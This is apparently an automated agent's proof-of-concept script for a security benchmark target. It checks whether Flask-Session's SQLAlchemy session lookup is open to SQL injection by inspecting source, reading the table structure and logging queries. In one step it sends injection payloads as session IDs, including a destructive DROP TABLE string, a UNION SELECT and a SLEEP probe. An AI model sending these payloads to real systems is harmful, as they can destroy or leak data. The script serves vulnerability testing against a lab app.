#!/bin/bash
# POC: Analyzes Flask-Session implementation code to detect SQL injection vulnerability in session ID lookup through code inspection and query analysis
# Target: ./repo
# Created: 2025-11-07T17:27:46.287Z
# Session: benchmark-XBEN-066-24-mhp3k0ub

# Flask-Session SQLi POC - Code Analysis and Database Query Inspection
# This POC examines the Flask-Session implementation to verify SQL injection vulnerability
# in session ID lookup queries

APP_PATH="${1:-.}"

echo "[*] Flask-Session SQL Injection Vulnerability Analysis"
echo "[*] Analyzing Flask-Session implementation for SQL injection in session lookup"
echo ""

# Step 1: Check Flask-Session installation and version
echo "[+] Step 1: Check Flask-Session version and location"
python3 << 'PYTHON_CODE'
try:
    import flask_session
    print(f"[*] Flask-Session version: {flask_session.__version__ if hasattr(flask_session, '__version__') else 'Unknown'}")
    print(f"[*] Flask-Session location: {flask_session.__file__}")
    
    # Inspect SqlAlchemySessionInterface
    from flask_session.sessions import SqlAlchemySessionInterface
    print("[*] SqlAlchemySessionInterface imported successfully")
    
    # Check for query construction in source
    import inspect
    source = inspect.getsource(SqlAlchemySessionInterface)
    if "format(" in source or "%" in source or "concatenate" in source or ".format" in source:
        print("[!] WARNING: Potential string formatting detected in session code")
    else:
        print("[*] No obvious string formatting detected (may use ORM)")
        
except Exception as e:
    print(f"[-] Error importing Flask-Session: {e}")
PYTHON_CODE

echo ""

# Step 2: Test malicious session ID directly against Flask-Session interface
echo "[+] Step 2: Test Flask-Session with malicious session IDs"
python3 << 'PYTHON_CODE'
import sys
sys.path.insert(0, '/home/daytona/repo/XBEN-066-24/app/website')

try:
    from app import app, db
    from flask_session.sessions import SqlAlchemySessionInterface
    from sqlalchemy import text
    
    print("[*] Flask application context loaded")
    
    # Test 1: Create a normal session
    print("\n[+] Test 1: Create and retrieve normal session")
    with app.app_context():
        normal_sid = "test_session_12345"
        session_data = {'username': 'testuser', 'user_id': 1}
        
        # Attempt to set session (this would use parameterized queries if properly implemented)
        print(f"[*] Testing session interface with SID: {normal_sid}")
        
    # Test 2: Check if session interface uses parameterized queries
    print("\n[+] Test 2: Inspect SqlAlchemySessionInterface query construction")
    with app.app_context():
        interface = SqlAlchemySessionInterface(app=app, client=db, table='mysessions')
        
        # Check the open method which retrieves sessions
        import inspect
        open_method = inspect.getsource(interface.open)
        
        if "WHERE" in open_method and ("WHERE sid" in open_method or "sid =" in open_method):
            print("[!] Found session ID lookup in open() method")
            
            # Check if it uses parameterized queries
            if ":sid" in open_method or "?" in open_method or "%s" in open_method:
                print("[+] Using parameterized queries (safe)")
            elif ".format(" in open_method or "f\"" in open_method or "%" in open_method:
                print("[!] WARNING: Using string formatting/concatenation (vulnerable!)")
            else:
                print("[*] Query construction method unclear")
        
        print("\n[*] open() method source snippet:")
        lines = open_method.split('\n')[:15]
        for line in lines:
            print(f"    {line}")
    
    # Test 3: Attempt SQL injection via session interface
    print("\n[+] Test 3: Attempt SQL injection through session lookup")
    with app.app_context():
        interface = SqlAlchemySessionInterface(app=app, client=db, table='mysessions')
        
        # Try to retrieve session with SQL injection payload
        malicious_sids = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM user --",
            "' AND SLEEP(5) --"
        ]
        
        for malicious_sid in malicious_sids:
            try:
                print(f"[*] Attempting to open session with payload: {malicious_sid}")
                result = interface.open(malicious_sid)
                print(f"    [*] Result: {result}")
            except Exception as e:
                error_msg = str(e)
                if "SQL" in error_msg or "syntax" in error_msg.lower():
                    print(f"    [!] SQL Error detected: {error_msg}")
                else:
                    print(f"    [*] Error: {type(e).__name__}: {error_msg}")
    
except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()
PYTHON_CODE

echo ""

# Step 3: Direct database inspection
echo "[+] Step 3: Inspect database for session table structure"
python3 << 'PYTHON_CODE'
import sys
sys.path.insert(0, '/home/daytona/repo/XBEN-066-24/app/website')

try:
    from app import db, app
    from sqlalchemy import inspect, text
    
    with app.app_context():
        # Check if mysessions table exists
        inspector = inspect(db.engine)
        tables = inspector.get_table_names()
        
        if 'mysessions' in tables:
            print("[+] Found 'mysessions' table")
            columns = inspector.get_columns('mysessions')
            print("[*] Table structure:")
            for col in columns:
                print(f"    - {col['name']}: {col['type']}")
            
            # Check for indexes on sid
            indexes = inspector.get_indexes('mysessions')
            print("[*] Indexes:")
            for idx in indexes:
                print(f"    - {idx['name']}: {idx['column_names']}")
        else:
            print("[-] mysessions table not found")
            print(f"[*] Available tables: {tables}")
            
except Exception as e:
    print(f"[-] Error: {e}")
PYTHON_CODE

echo ""

# Step 4: Monitor actual queries
echo "[+] Step 4: Inspect query logs for parameterization"
python3 << 'PYTHON_CODE'
import sys
sys.path.insert(0, '/home/daytona/repo/XBEN-066-24/app/website')

try:
    from app import app, db
    from sqlalchemy import event
    
    # Enable SQL query logging
    import logging
    logging.basicConfig()
    logging.getLogger('sqlalchemy.engine').setLevel(logging.INFO)
    
    queries_logged = []
    
    @event.listens_for(db.engine, "before_cursor_execute")
    def receive_before_cursor_execute(conn, cursor, statement, parameters, context, executemany):
        queries_logged.append({
            'statement': statement,
            'parameters': parameters
        })
    
    print("[*] SQL query logging enabled")
    print("[*] Queries with parameterized placeholders are safe")
    print("[*] Queries with direct variable injection are vulnerable")
    
except Exception as e:
    print(f"[-] Error setting up query logging: {e}")
PYTHON_CODE

echo ""
echo "[*] Analysis complete"
echo "[*] Summary:"
echo "    - Check Flask-Session version for known vulnerabilities"
echo "    - Verify parameterized query usage in session lookup"
echo "    - Check for SQL error responses in session handling"
echo "    - Review Flask-Session changelog for SQL injection fixes"